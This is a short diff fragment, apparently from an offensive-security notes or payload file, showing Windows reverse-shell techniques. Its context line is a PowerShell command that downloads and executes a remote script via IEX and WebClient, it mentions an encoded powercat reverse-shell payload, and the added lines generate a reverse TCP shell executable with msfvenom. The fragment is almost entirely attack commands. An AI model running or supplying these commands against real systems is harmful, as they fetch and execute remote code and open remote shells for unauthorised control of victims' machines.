@@ -6,3 +6,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<
 
 ::There is also a encoded version of this payload in the /Payloads directory: EncodedPowercatRevShell.py
 
+::If powercat doesn't works, we can stabilise the shell using msfvenom:
+
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=$(hostname -I | cut -d " " -f2) LPORT=<LOCALPORT> -f exe -o payload.exe
+
